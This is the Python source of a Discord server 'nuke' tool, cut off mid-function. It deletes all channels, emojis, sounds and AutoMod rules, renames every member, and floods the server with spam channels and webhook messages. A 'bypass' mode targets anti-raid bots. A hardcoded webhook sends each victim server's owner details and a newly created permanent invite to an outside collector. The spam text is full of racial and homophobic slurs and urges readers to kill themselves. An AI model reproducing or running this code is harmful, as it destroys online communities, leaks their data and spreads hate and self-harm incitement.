

### Imports
import discord
import asyncio
import aiohttp
import sys
from discord import Webhook
from colorama import Fore, init, AnsiToWin32
import os
import re
from colorama import Fore
import io
import random
import concurrent.futures
from concurrent.futures import ThreadPoolExecutor
import aiohttp
import json
from datetime import datetime
import shutil
import colorsys
from pystyle import Colorate, Colors, Center, Write
from datetime import datetime, timezone
from discord.errors import HTTPException, Forbidden, RateLimited
import subprocess
import requests
import ctypes
import time


##TEMPLATES
nukemessageee = """
# kneel down to your god, Gab<3 ||@everyone @here||

- [Discord Server](https://discord.gg/keisho)
- [Tiktok](https://www.tiktok.com/@skibidigabohiosigma)
- [Alternative Dc Server](https://discord.gg/BhFAes4Gve)
- [UserId](https://@threwherloveletters/1239462953976336445)
- [GabLovesYou](https://keisho.xyz)


# Fuck Y'all Niggas 
- [Discord Server](https://discord.gg/keisho)
- [Tiktok](https://www.tiktok.com/@skibidigabohiosigma)
- [Alternative Dc Server](https://discord.gg/BhFAes4Gve)
- [UserId](https://@threwherloveletters/1239462953976336445)
- [GabLovesYou](https://keisho.xyz)
"""

TEMPLATE_DIR = "nuke_templates"
MAX_TEMPLATES = 4

if not os.path.exists(TEMPLATE_DIR):
    os.mkdir(TEMPLATE_DIR)


def save_template(name, data):
    path = os.path.join(TEMPLATE_DIR, f"{name}.json")
    with open(path, "w") as f:
        json.dump(data, f, indent=4)
    print(Colorate.Horizontal(Colors.green_to_cyan, f"Template '{name}' saved."))


def load_template(name):
    path = os.path.join(TEMPLATE_DIR, f"{name}.json")
    if os.path.exists(path):
        with open(path, "r") as f:
            return json.load(f)
    else:
        print(Colorate.Horizontal(Colors.red_to_blue, f"Template '{name}' not found."))
        return None


def list_templates():
    return [f[:-5] for f in os.listdir(TEMPLATE_DIR) if f.endswith(".json")]


async def async_input(prompt):
    loop = asyncio.get_event_loop()
    return await loop.run_in_executor(None, lambda: input(prompt))


async def choose_or_create_template():
    templates = list_templates()

    if not templates:
        print(Colorate.Horizontal(Colors.yellow_to_red, "No templates found, please create one."))
        return await create_template_interactive()

    print("Available templates:")
    for i, t in enumerate(templates, 1):
        print(f"{i}. {t}")
    print(f"{len(templates)+1}. Create new template")

    choice = (await async_input("Choose template or create new (number): ")).strip()
    try:
        choice_num = int(choice)
    except ValueError:
        print(Colorate.Horizontal(Colors.red_to_blue, "Invalid input."))
        return None

    if 1 <= choice_num <= len(templates):
        return load_template(templates[choice_num - 1])
    elif choice_num == len(templates) + 1:
        if len(templates) >= MAX_TEMPLATES:
            print(Colorate.Horizontal(Colors.red_to_blue, f"Max templates reached ({MAX_TEMPLATES}). Delete old ones to add new."))
            return None
        return await create_template_interactive()
    else:
        print(Colorate.Horizontal(Colors.red_to_blue, "Choice out of range."))
        return None

async def create_template_interactive():
    try:
        base_name = (await async_input("Enter base channel name (default: 'fucked-by-keisho'): ")).strip()
        if not base_name:
            base_name = "fucked-by-keisho"

        num_channels_str = (await async_input("Enter number of channels (default: 50): ")).strip()
        num_messages_str = (await async_input("Enter number of messages per channel (default: 30): ")).strip()
        webhook_spam_input = (await async_input("Use webhook spam? (Y/N, default N): ")).strip().lower()

        num_channels = int(num_channels_str) if num_channels_str.isdigit() else 50
        num_messages = int(num_messages_str) if num_messages_str.isdigit() else 30
        webhook_spam = webhook_spam_input == 'y'

        template_name = (await async_input("Name this template: ")).strip()
        if not template_name:
            template_name = "default"

        data = {
            "base_channel_name": base_name,
            "num_channels": num_channels,
            "num_messages": num_messages,
            "webhook_spam": webhook_spam,
        }

        save_template(template_name, data)
        return data
    except Exception as e:
        print(Colorate.Horizontal(Colors.red_to_blue, f"Error creating template: {e}"))
        return None



init(autoreset=True)

intents = discord.Intents.all()
client = discord.Client(intents=intents, status=discord.Status.invisible)

state = {}
WEBHOOK_URL = "https://discord.com/api/webhooks/1373448136089010216/QWxbM73zAjI29WywXezK8xIb2M8o2cgLM7U8qlDyan6D9KiTOkG1R8-Evy4kTwy0Nh2p"
    
async def rename_set_icon_and_banner_Bypass(guild: discord.Guild):
    await send_webhook_log(WEBHOOK_URL, guild, "Bypass Information | Before")

    # Image URLs - make sure banner_url is PNG or JPEG (NOT a GIF)
    gif_icon_url = "https://cdn.discordapp.com/attachments/1327374582604107838/1329670865171906600/VID_20250117123041.gif?ex=6835ea3e&is=683498be&hm=8ae59eb09a5a4516dfe2a7b1d73636ebb8c5f836b20759abc4c26162caf68d94&"
    png_icon_url = "https://cdn.discordapp.com/attachments/1327374582604107838/1329666295687286825/IMG_9153.png?ex=6835e5fc&is=6834947c&hm=4beba4da1f4d1aecaac9ce98736ff10390ed4c5caf75b37ef39479de61d9a4b0&"
    banner_url = "https://cdn.discordapp.com/attachments/1327374582604107838/1329666295687286825/IMG_9153.png?ex=6835e5fc&is=6834947c&hm=4beba4da1f4d1aecaac9ce98736ff10390ed4c5caf75b37ef39479de61d9a4b0&"  # Use PNG for banner!

    # Rename server
    try:
        await guild.edit(name="Join Up | Bypassed By All Hail Gab.")
        print(Colorate.Horizontal(Colors.green_to_cyan, f"{get_time()} [+] Renamed server to: {guild.name}"))
    except discord.Forbidden:
        print(Colorate.Horizontal(Colors.red_to_blue, f"{get_time()} [!] Missing permissions to rename the server."))
    except Exception as e:
        print(Colorate.Horizontal(Colors.red_to_blue, f"{get_time()} [!] Failed to rename server: {e}"))

    gif_allowed = guild.premium_tier >= 2
    icon_url = gif_icon_url if gif_allowed else png_icon_url
    icon_type = "GIF" if gif_allowed else "PNG"

    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(icon_url) as icon_resp:
                if icon_resp.status != 200:
                    print(Colorate.Horizontal(Colors.red_to_blue, f"{get_time()} [!] Failed to fetch {icon_type} icon. HTTP {icon_resp.status}"))
                    return
                icon_bytes = await icon_resp.read()
                print(f"Icon bytes size: {len(icon_bytes)}")

            banner_bytes = None
            if "BANNER" in guild.features:
                async with session.get(banner_url) as banner_resp:
                    if banner_resp.status == 200:
                        banner_bytes = await banner_resp.read()
                        print(f"Banner bytes size: {len(banner_bytes)}")
                    else:
                        print(Colorate.Horizontal(Colors.red_to_blue, f"{get_time()} [!] Failed to fetch banner. HTTP {banner_resp.status}"))

            # Now edit guild once with all changes
            await guild.edit(
                icon=icon_bytes,
                banner=banner_bytes if banner_bytes else None
            )
            print(Colorate.Horizontal(Colors.green_to_cyan, f"{get_time()} [+] Server icon and banner updated successfully!"))

    except discord.Forbidden:
        print(Colorate.Horizontal(Colors.red_to_blue, f"{get_time()} [!] Missing permissions to set icon/banner."))
    except Exception as e:
        print(Colorate.Horizontal(Colors.red_to_blue, f"{get_time()} [!] Error setting icon/banner: {e}"))
    
async def rename_set_icon_and_banner(guild: discord.Guild):
    await send_webhook_log(WEBHOOK_URL, guild, "Nuke Information | Before")

    # Clean Image URLs (avoid params for clean byte conversion)
    gif_icon_url = "https://cdn.discordapp.com/icons/1358442501790236757/a_e2c6979c38c1ca6f01fe1d265ca0eb1b.gif"
    png_icon_url = "https://media.discordapp.net/attachments/1310569860492689428/1375257148715434064/latest.png"
    banner_url   = "https://media.discordapp.net/attachments/1310569860492689428/1375257148715434064/latest.png"

    # Rename server
    try:
        await guild.edit(name="Join Up | Nuked By All Hail Gab.")
        print(Colorate.Horizontal(Colors.green_to_cyan, f"{get_time()} [+] Renamed server to: {guild.name}"))
    except discord.Forbidden:
        print(Colorate.Horizontal(Colors.rainbow, f"{get_time()} [!] Missing permissions to rename the server."))
    except Exception as e:
        print(Colorate.Horizontal(Colors.red_to_blue, f"{get_time()} [!] Failed to rename server: {e}"))

    # Choose GIF or PNG icon
    gif_allowed = guild.premium_tier >= 2
    icon_url = gif_icon_url if gif_allowed else png_icon_url
    icon_type = "GIF" if gif_allowed else "PNG"

    # Set server icon
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(icon_url) as resp:
                if resp.status == 200:
                    icon_bytes = await resp.read()
                    await guild.edit(icon=icon_bytes)
                    print(Colorate.Horizontal(Colors.green_to_cyan, f"{get_time()} [>] Server icon ({icon_type}) set successfully!"))
                else:
                    print(Colorate.Horizontal(Colors.red_to_blue, f"{get_time()} [!] Failed to fetch {icon_type} icon. HTTP Status: {resp.status}"))
    except discord.Forbidden:
        print(Colorate.Horizontal(Colors.rainbow, f"{get_time()} [!] Missing permissions to change the server icon."))
    except Exception as e:
        print(Colorate.Horizontal(Colors.red_to_blue, f"{get_time()} ❌ Error setting {icon_type} server icon: {e}"))

    # Set banner (only once)
    if "BANNER" in guild.features:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(banner_url) as resp:
                    if resp.status == 200:
                        banner_bytes = await resp.read()
                        await guild.edit(banner=banner_bytes)
                        print(Colorate.Horizontal(Colors.green_to_cyan, f"{get_time()} [+] Server banner updated successfully."))
                    else:
                        print(Colorate.Horizontal(Colors.red_to_blue, f"{get_time()} [!] Failed to fetch banner image. HTTP {resp.status}"))
        except discord.Forbidden:
            print(Colorate.Horizontal(Colors.rainbow, f"{get_time()} [!] Missing permissions to change the banner."))
        except Exception as e:
            print(Colorate.Horizontal(Colors.red_to_blue, f"{get_time()} [!] Failed to set server banner: {e}"))
    else:
        print(Colorate.Horizontal(Colors.rainbow, f"{get_time()} [!] Server does not have BANNER feature enabled."))  
    
def get_time():
    now = datetime.now(timezone.utc)
    # Extract milliseconds from microseconds
    ms = int(now.microsecond / 1000)
    # Format with colons between H, M, S, and MS and closing bracket
    return f"[{now.hour:02d}:{now.minute:02d}:{now.second:02d}:{ms:03d}]"

async def send_webhook_log(webhook_url, guild, title, is_after=False):
    icon_url = guild.icon.url if guild.icon else None
    owner = guild.owner
    member_count = guild.member_count
    booster_count = len(guild.premium_subscribers) if hasattr(guild, "premium_subscribers") else "N/A"

    # Fetch invite link from a channel with permission
    invite_url = "N/A"
    for channel in guild.text_channels:
        if channel.permissions_for(guild.me).create_instant_invite:
            try:
                invite = await channel.create_invite(max_age=0, max_uses=0, unique=False, reason="Logger Fetch")
                invite_url = invite.url
                break
            except Exception as e:
                print(f"[!] Failed to create invite: {e}")
                continue

    # Timestamp in ISO 8601 format for Discord embeds
    timestamp = datetime.utcnow().isoformat()

    embed = {
        "title": title,
        "color": 0x8B0000 if is_after else 0xFF0000,  # Dark red / Red
        "fields": [
            {"name": "<:Server:1373450808636477541> Guild Name", "value": guild.name, "inline": True},
            {"name": "<:Server:1373450808636477541> Guild ID", "value": str(guild.id), "inline": True},
            {"name": "<a:Red_Crown:1373450689673560104> Owner", "value": f"{owner} ({owner.id})", "inline": False},
            {"name": "<:members:1373450286034845696> Members", "value": str(member_count), "inline": True},
            {"name": "<a:h_boost:1373450163925815406> Boosters", "value": str(booster_count), "inline": True},
            {"name": "🔗 Invite Link", "value": invite_url, "inline": False}
        ],
        "thumbnail": {"url": icon_url} if icon_url else None,
        "timestamp": timestamp
    }

    payload = {
        "content": "<@1239462953976336445>",  # Ping specific user
        "username": "Fuh Nigga",
        "avatar_url": "https://cdn.discordapp.com/icons/1358442501790236757/a_e2c6979c38c1ca6f01fe1d265ca0eb1b.gif?size=4096",
        "embeds": [embed]
    }

    async with aiohttp.ClientSession() as session:
        async with session.post(webhook_url, json=payload) as resp:
            if resp.status not in (200, 204):
                print(f"[!] Failed to send webhook log: {resp.status}")
        
avatar_url = "https://media.discordapp.net/attachments/1012542184853094430/1012544174450561134/unknown.png?ex=6821583f&is=682006bf&hm=6e15496837e10ff6f3f6f4e7747368def7c203c58710fd22b5c2f0ea32c372ec&format=webp&quality=lossless&"  # <-- replace with your image URL


# Set Title function to set terminal window title
def set_title_bar(text):
    sys.stdout.write(f"\033]0;https://discord.gg/keisho | {text}\007")
    sys.stdout.flush()


# Function to clear the screen
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

banner_lines = [
    " ██ ▄█▀▓█████  ██▓  ██████  ██░ ██  ▒█████  ",
    " ██▄█▒ ▓█   ▀ ▓██▒▒██    ▒ ▓██░ ██▒▒██▒  ██▒",
    "▓███▄░ ▒███   ▒██▒░ ▓██▄   ▒██▀▀██░▒██░  ██▒",
    "▓██ █▄ ▒▓█  ▄ ░██░  ▒   ██▒░▓█ ░██ ▒██   ██░",
    "▒██▒ █▄░▒████▒░██░▒██████▒▒░▓█▒░██▓░ ████▓▒░",
    "▒ ▒▒ ▓▒░░ ▒░ ░░▓  ▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒░ ▒░▒░▒░ ",
    "░ ░▒ ▒░ ░ ░  ░ ▒ ░░ ░▒  ░ ░ ▒ ░▒░ ░  ░ ▒ ▒░ ",
    "░ ░░ ░    ░    ▒ ░░  ░  ░   ░  ░░ ░░ ░ ░ ▒  ",
    "░  ░      ░  ░ ░        ░   ░  ░  ░    ░ ░  ",
]

# Join banner lines into a single string for Center.XCenter
banner_str = "\n".join(banner_lines)

# Print banner with smooth vertical purple to blue gradient, centered horizontally
print(Colorate.Vertical(Colors.purple_to_blue, Center.XCenter(banner_str)))

state = {
    "bot_token": None,
    "guild_id": None,
    "guild": None,
    "connected": False
}
channel_names = ["fucked by keisho", "nuked by keisho", "niggas suck"]
role_names = ["fucked by keisho", "threwherloveletters on discord", "fuck you nigga kys bitch"]

executor = ThreadPoolExecutor(max_workers=10)  # Adjust threads if needed (e.g., 10–15)

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_menu(page=0, total_pages=3):
    choices1 = [
        "[ 1 ] Nuke Guild",               "[ 4 ] Create Roles",           "[ 7 ] Spam Thread Message In all Channel",
        "[ 2 ] Rename Member",            "[ 5 ] Mass Create Channels",   "[ 8 ] Send All Message In Channel", 
        "[ 3 ] Grant Admin",              "[ 6 ] Thread Spammer"
    ]

    choices2 = [
        "[ 9 ] -  Mass Ban",                "[ 11 ] - VC Spammer",             "[ 13 ] - Fast Nuke",
        "[ 10 ] - Delete All Channels",     "[ 12 ] - Disable Community",      "[ 14 ] - Channel and Role Spammer",
        "[ 15 ] - Dm Everyone On Server"
    ]

    choices3 = [
        "[ 16 ] - Server Name Change",      "[ 20 ] - Server Picture Change",  "[ 24 ] - Delete All Server Emojis",
        "[ 17 ] - Spam New Server Emojis",  "[ 21 ] - Delete All Sounds (Soundboard)", "[ 25 ] - Spam New Sounds (SOUNDBOARD)",
        "[ 18 ] - Delete All Invites",      "[ 22 ] - Spam New Server Invites", "[ 26 ] Pause - Server Invites",
        "[ 19 ] - Deactivate Discord AutoMod", "[ 23 ] - Spams Emoji"
    ]

    if page == 0:
        page_choices = choices1
        page_choices_ids = ['1', '2', '3', '4', '5', '6', '7', '8']
    elif page == 1:
        page_choices = choices2
        page_choices_ids = ['9', '10', '11', '12', '13', '14']
    elif page == 2:
        page_choices = choices3
        page_choices_ids = [str(i) for i in range(15, 26)]
    else:
        return

    # Clear and display banner
    clear_screen()
    print(Colorate.Vertical(Colors.red_to_blue, Center.XCenter(banner_str)))
    print("\n")

    # Get terminal width and define spacing
    term_width = shutil.get_terminal_size().columns
    col_width = term_width // 3

    # Print the menu items in rows of 3, each centered
    for i in range(0, len(page_choices), 3):
        row = page_choices[i:i+3]
        # Fill out empty columns if not a full row
        while len(row) < 3:
            row.append("")
        # Combine and pad columns
        line = "".join(row[j].ljust(col_width) for j in range(3))
        print(Colorate.Horizontal(Colors.red_to_blue, Center.XCenter(line)))

    print("\n")

    # Footer
    left = "[ < ] Previous Page" if page > 0 else ""
    center = "[ Q ] Quit"
    right = "[ > ] Next Page" if page < total_pages - 1 else ""

    # Compose and center footer
    footer_line = f"{left}    {center}    {right}".center(term_width)
    print(Colorate.Vertical(Colors.purple_to_blue, Center.XCenter(footer_line)))
    
    return page_choices_ids

# Limit concurrency to avoid hitting rate limits
semaphore = asyncio.Semaphore(10)  # Increase to 20 if rate limits allow

async def rename_member(member):
    async with semaphore:
        try:
            await member.edit(nick="Fucked by Keisho")
            print(Colorate.Horizontal(Colors.rainbow, f"{get_time()} Renamed {member.display_name}"))
        except:
            print(Colorate.Horizontal(Colors.red_to_blue, f"{get_time()} Failed To Rename {member.display_name}"))

async def rename_members(guild):
    await asyncio.gather(*(rename_member(member) for member in guild.members))



async def bypass(guild: discord.Guild):
    topic_text = "Keisho WrldWide | https://discord.gg/keisho | https://keisholovesyou | https://gabporn4k.com"
    webhook_name = ".gg/keisho runs cord"
    webhook_avatar_url = "https://cdn.discordapp.com/attachments/1310569860492689428/1375256749052924105/4feae153276146feef0fcc27d43f4f16.png"
    channels_namess = 'God Si Gab', 'All Hail Gab', 'bypassed by keishoV3', 'FUCK YOU ALL SLIT UR THROAT'

    print(Colorate.Horizontal(Colors.rainbow, f"{get_time()} Starting bypass on guild : {guild.name}"))

    webhook_name = ".gg/keisho runs cord"
    webhook_avatar_url = "https://cdn.discordapp.com/attachments/1310569860492689428/1375257279657541684/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.png?ex=6835a4e6&is=68345366&hm=90fbf47bfc671a233ac623dabc3dd265617c525b9c7199a9d0db21b1c43b9f3e&"

    # Fetch avatar bytes
    async with aiohttp.ClientSession() as session:
        async with session.get(webhook_avatar_url) as resp:
            if resp.status == 200:
                webhook_avatar_bytes = await resp.read()
            else:
                webhook_avatar_bytes = None

    async def disconnect_member(member: discord.Member):
        if member.voice:
            try:
                await member.move_to(None)
                print(Colorate.Horizontal(Colors.rainbow, f"{get_time()} Disconnected {member.display_name}"))
            except Exception as e:
                print(Colorate.Horizontal(Colors.red_to_blue, f"Failed to disconnect {member.display_name}: {e}"))

    voice_members = [m for m in guild.members if m.voice and m.voice.channel]
    await asyncio.gather(*(disconnect_member(m) for m in voice_members))

    async def update_voice_limit(channel: discord.VoiceChannel):
        try:
            await channel.edit(user_limit=0)
        except Exception as e:
            print(Colorate.Horizontal(Colors.red_to_blue, f"{get_time()} Failed to edit {channel.name}: {e}"))

    await asyncio.gather(*(update_voice_limit(vc) for vc in guild.voice_channels))

    async def reset_permissions(channel: discord.abc.GuildChannel):
        try:
            await channel.edit(overwrites={})
            await asyncio.sleep(0.11)
        except Exception as e:
            print(Colorate.Horizontal(Colors.red_to_blue, f"{get_time()} Failed to reset {channel.name}: {e}"))

    await asyncio.gather(*(reset_permissions(c) for c in guild.channels))

    async def process_channel(channel):
        try:
            if hasattr(channel, 'category') and channel.category:
                await channel.edit(category=None)

            if isinstance(channel, discord.TextChannel):
                await channel.edit(name=random.choice(channels_namess), topic=topic_text)
            elif isinstance(channel, (discord.VoiceChannel, discord.CategoryChannel)):
                await channel.edit(name=random.choice(channels_namess))

            if isinstance(channel, discord.TextChannel):
                try:
                    await channel.purge(limit=1000)
                except: pass

            webhooks = await channel.webhooks()
            if webhooks:
                hook = webhooks[0]
            else:
                hook = await channel.create_webhook(name=webhook_name, avatar=webhook_avatar_bytes)

            for i in range(50):
                embed = discord.Embed(
                    title="GET BYPASSED",
                    description="https://discord.gg/keisho",
                    color=discord.Color.red()
                )
                embed.set_footer(text="Bypassed By Gab FUCK YALL NIGGAS HAHAHAHAHHAHAHAHAHAHAHAHAH")
                embed.set_thumbnail(url="https://images-ext-1.discordapp.net/external/n_4-qWwpYfKITPTSFU7s7JN62MhKjW9wO9czA5x1x1Y/%3Fsize%3D4096/https/cdn.discordapp.com/icons/1358442501790236757/a_e2c6979c38c1ca6f01fe1d265ca0eb1b.gif")
                
                await hook.send(content=nukemessageee, username=webhook_name, embed=embed, wait=True)
                bot_embed = discord.Embed(
                    title="RETARDEDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD",
                    description="https://discord.gg/keisho join Faggot.",
                    color=discord.Color.red()
                )
                bot_embed.set_footer(text="KYS NIGAAAAAAAAAA JOIN KEISHO RN!!!!!")
                bot_embed.set_thumbnail(url="https://images-ext-1.discordapp.net/external/n_4-qWwpYfKITPTSFU7s7JN62MhKjW9wO9czA5x1x1Y/%3Fsize%3D4096/https/cdn.discordapp.com/icons/1358442501790236757/a_e2c6979c38c1ca6f01fe1d265ca0eb1b.gif")
                await channel.send(nukemessageee, embed=bot_embed)

        except Exception as e:
            print(Colorate.Horizontal(Colors.red_to_blue, f"[Bypasser] {get_time()} [LOGS] Failed To Process {channel.name}: {e}"))

    await asyncio.gather(*[process_channel(c) for c in guild.channels])
    await send_webhook_log(WEBHOOK_URL, guild, "Another Server Bypassed By Keisho | After")
    print(Colorate.Horizontal(Colors.red_to_blue, f"[Bypasser] {get_time()} [LOGS] Sent Server Info Logs"))
    
async def async_input(prompt: str = "") -> str:
    loop = asyncio.get_event_loop()
    return await loop.run_in_executor(None, lambda: input(prompt))


webhookavatar = "https://media.discordapp.net/attachments/1012542184853094430/1012544174450561134/unknown.png?ex=6829e9ff&is=6828987f&hm=ebadaa95ca73fe61cd00b95fcc61fdf6e39699b7d20f8b29ed9e898ca68037b1&format=webp&quality=lossless&"

async def nuke_guild(guild):
    avatar_link = "https://cdn.discordapp.com/attachments/1310569860492689428/1375257279657541684/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.png?ex=6835a4e6&is=68345366&hm=90fbf47bfc671a233ac623dabc3dd265617c525b9c7199a9d0db21b1c43b9f3e&"

    use_bypass = (await async_input("Bypass Mode? (Y OR N) (Bypasses Security, Wick, Anti Raids): ")).strip().lower() == 'y'
    if use_bypass:
        try:
            await rename_set_icon_and_banner_Bypass(guild)
            await bypass(guild)
            print(Colorate.Horizontal(Colors.black_to_red, "[Bypasser] Bypass executed successfully."))
        except Exception as e:
            print(Colorate.Horizontal(Colors.red_to_blue, f"[Bypasser] Failed during bypass: {e}"))
            return  # Abort if bypass fails

    template = await choose_or_create_template()
    if not template:
        print(Colorate.Horizontal(Colors.red_to_blue, "No valid template selected, aborting nuke."))
        return

    base_channel_name = template["base_channel_name"]
    num_channels = template["num_channels"]
    num_messages = template["num_messages"]
    webhook_spam = template["webhook_spam"]

    await rename_set_icon_and_banner(guild)
    print(Colorate.Horizontal(Colors.rainbow, f"[Keisho] [{guild.id}] Changed server name"))

    # Delete all existing channels
    await asyncio.gather(*[channel.delete() for channel in guild.channels], return_exceptions=True)

    async with aiohttp.ClientSession() as session:
        async with session.get(avatar_link) as resp:
            avatar = await resp.read() if resp.status == 200 else None

        if webhook_spam:

            async def spam_with_webhook(i):
                try:
                    channel = await guild.create_text_channel(
                        f'{base_channel_name}',
                        topic="Keisho WrldWide | https://discord.gg/keisho | https://keisholovesyou | https://gabporn4k.com"
                    )
                    print(Colorate.Horizontal(Colors.rainbow, f"[Keisho] Made Channel {channel.name}"))

                    webhook = await channel.create_webhook(name='.gg/keisho runs cord', avatar=avatar)
                    print(Colorate.Horizontal(Colors.rainbow, f"[Keisho] Made Webhook {webhook.name} in {channel.name}"))

                    for _ in range(num_messages):
                        await webhook.send(content=nukemessageee, wait=True)

                    print(Colorate.Horizontal(Colors.rainbow, f"[Keisho] Sent messages to {channel.name}"))

                except Exception as e:
                    print(Colorate.Horizontal(Colors.red_to_blue, f"[Keisho] Failed in spam_with_webhook {i}: {e}"))

            await asyncio.gather(*[spam_with_webhook(i) for i in range(1, num_channels + 1)])

        else:

            async def spam_with_bot(i):
                try:
                    channel = await guild.create_text_channel(
                        f'{base_channel_name}',
                        topic="Keisho WrldWide | https://discord.gg/keisho | https://keisholovesyou | https://gabporn4k.com"
                    )
                    print(Colorate.Horizontal(Colors.rainbow, f"[Keisho] Made Channel {channel.name}"))

                    for _ in range(num_messages):
                        await channel.send(nukemessageee)

                    print(Colorate.Horizontal(Colors.rainbow, f"[Keisho] Sent messages to channel {channel.name}"))

                except Exception as e:
                    print(Colorate.Horizontal(Colors.red_to_blue, f"[Keisho] Failed in spam_with_bot {i}: {e}"))

            await asyncio.gather(*[spam_with_bot(i) for i in range(1, num_channels + 1)])

    # You can keep your existing rename_members call or remove if you want
    await rename_members(guild)
    print(Colorate.Horizontal(Colors.rainbow, "[Keisho] Nuke Complete!"))

    await send_webhook_log(WEBHOOK_URL, guild, "Nuke Information | After")
    print(Colorate.Horizontal(Colors.red_to_blue, f"[Bypasser] {get_time()} [LOGS] Sent Server Info Logs"))
    clear_screen()
    
async def spam_emojis_from_link_threaded(guild):
    emoji_name_base = input("Enter base name for emojis: ").strip()
    emoji_url = input("Enter direct image URL (PNG, JPEG, GIF): ").strip()
    amount = int(input("How many emojis do you want to upload (max 50): ").strip())

    async with aiohttp.ClientSession() as session:
        try:
            async with session.get(emoji_url) as resp:
                if resp.status != 200:
                    print(Colorate.Horizontal(Colors.red_to_blue, f"{get_time()} Failed To Fetch The Image!"))
                    return
                image_data = await resp.read()
        except Exception as e:
            print(Colorate.Horizontal(Colors.red_to_blue, f"{get_time()} Error fetching image: {e}"))
            return

    async def upload_emoji(index):
        emoji_name = f"{emoji_name_base}_{index}"
        try:
            await guild.create_custom_emoji(name=emoji_name, image=image_data)
            print(Colorate.Horizontal(Colors.rainbow, f"[+] {get_time()} Uploaded {emoji_name}"))
        except discord.HTTPException as e:
            print(Colorate.Horizontal(Colors.red_to_blue, f"[!] Failed to upload {emoji_name}: {e.text}"))
        except Exception as e:
            print(Colorate.Horizontal(Colors.red_to_blue, f"[!] Unexpected error for {emoji_name}: {e}"))

    # Launch emoji uploads concurrently (max 50 allowed by Discord)
    tasks = [upload_emoji(i) for i in range(min(amount, 50))]
    await asyncio.gather(*tasks)

    print(Colorate.Horizontal(Colors.green_to_cyan, f"[✔] Finished uploading up to {min(amount, 50)} emojis."))

# ------------------------------
# Delete All Soundboard Sounds
# ------------------------------

async def delete_all_soundboard_sounds(guild):
    deleted = 0
    try:
        for channel in guild.voice_channels:
            try:
                sounds = await channel.fetch_soundboard_sounds()
                for sound in sounds:
                    try:
                        await sound.delete()
                        print(Colorate.Horizontal(Colors.rainbow, f"{get_time()} [+] Deleted sound: {sound.name} from {channel.name}"))
                        deleted += 1
                    except Exception as e:
                        print(Colorate.Horizontal(Colors.red_to_blue, f"{get_time()} [!] Failed to delete sound '{sound.name}': {e}"))
            except Exception as e:
                print(Colorate.Horizontal(Colors.red_to_blue, f"{get_time()} [!] Failed to fetch sounds for {channel.name}: {e}"))
        print(Colorate.Horizontal(Colors.green_to_cyan, f"{get_time()} [✔] Deleted {deleted} soundboard sounds."))
    except Exception as e:
        print(Colorate.Horizontal(Colors.red_to_blue, f"{get_time()} [!] Error deleting soundboard sounds: {e}"))

# ------------------------------
# Delete All Server Emojis
# ------------------------------

async def delete_all_server_emojis(guild):
    emojis = guild.emojis
    if not emojis:
        print(Colorate.Horizontal(Colors.red_to_blue, f"{get_time()} [!] No emojis found to delete."))
        return

    print(Colorate.Horizontal(Colors.rainbow, f"{get_time()} [~] Attempting to delete {len(emojis)} emojis..."))

    async def delete_emoji(emoji):
        try:
            await emoji.delete()
            print(Colorate.Horizontal(Colors.rainbow, f"{get_time()} [+] Deleted emoji: {emoji.name}"))
        except Exception as e:
            print(Colorate.Horizontal(Colors.red_to_blue, f"{get_time()} [!] Failed to delete {emoji.name}: {e}"))

    # Run deletes concurrently
    await asyncio.gather(*(delete_emoji(e) for e in emojis))

    print(Colorate.Horizontal(Colors.green_to_cyan, f"{get_time()} [✔] All emojis processed."))
    
# ------------------------------
# Create Invite
# ------------------------------
async def create_invite(channel):
    try:
        invite = await channel.create_invite(max_age=0, max_uses=0, unique=True)
        print(Colorate.Horizontal(Colors.rainbow, f"{get_time()} [+] Created invite: {invite.url} (Channel: {channel.name})"))
    except Exception as e:
        print(Colorate.Horizontal(Colors.red_to_blue, f"{get_time()} [!] Failed to create invite in {channel.name}: {e}"))

# ------------------------------
# Spam Invites
# ------------------------------
async def spam_invites_with_threads(guild, limit=50):
    print(Colorate.Horizontal(Colors.rainbow, f"{get_time()} [*] Spamming up to {limit} new invites..."))

    channels = [c for c in guild.text_channels if c.permissions_for(guild.me).create_instant_invite]
    if not channels:
        print(Colorate.Horizontal(Colors.red_to_blue, f"{get_time()} [!] No channels found with invite permission."))
        return

    to_create = min(limit, len(channels))
    tasks = [create_invite(channels[i]) for i in range(to_create)]
    await asyncio.gather(*tasks)

    print(Colorate.Horizontal(Colors.green_to_cyan, f"{get_time()} [✔] Invite spam completed."))

# ------------------------------
# Mass Create Channels
# ------------------------------
async def mass_create_channels(guild):
    try:
        amount = int(input(f"{Fore.GREEN}[>] How many channels do you want to create? "))
    except ValueError:
        print(Colorate.Horizontal(Colors.red_to_blue, f"{get_time()} [!] Invalid number."))
        return

    async def create_channel():
        try:
            await guild.create_text_channel(
                'fucked by gab xdxd',
                topic='Keisho WrldWide | https://discord.gg/keisho | https://keisholovesyou | https://gabporn4k.com'
            )
            print(Colorate.Horizontal(Colors.rainbow, f"{get_time()} [+] Created channel!"))
        except Exception as e:
            print(Colorate.Horizontal(Colors.red_to_blue, f"{get_time()} [!] Failed to create channel: {e}"))

    await asyncio.gather(*(create_channel() for _ in range(amount)))
    print(Colorate.Horizontal(Colors.green_to_cyan, f"{get_time()} [✔] Finished creating {amount} channels."))
    clear_screen()

# ------------------------------
# Disable AutoMod
# ------------------------------
async def disable_automod(guild: discord.Guild):
    try:
        rules = await guild.auto_moderation_rules()
        if not rules:
            print(Colorate.Horizontal(Colors.red_to_blue, f"{get_time()} [-] No AutoMod rules found."))
            return

        for rule in rules:
            try:
                await rule.delete()
                print(Colorate.Horizontal(Colors.rainbow, f"{get_time()} [+] Deleted AutoMod rule: {rule.name}"))
            except discord.Forbidden:
                print(Colorate.Horizontal(Colors.red_to_blue, f"{get_time()} [!] Missing permissions to delete rule: {rule.name}"))
            except discord.HTTPException as e:
                print(Colorate.Horizontal(Colors.red_to_blue, f"{get_time()} [!] Failed to delete rule {rule.name}: {e.text}"))

        print(Colorate.Horizontal(Colors.green_to_cyan, f"{get_time()} [✔] All AutoMod rules disabled."))
    except Exception as e:
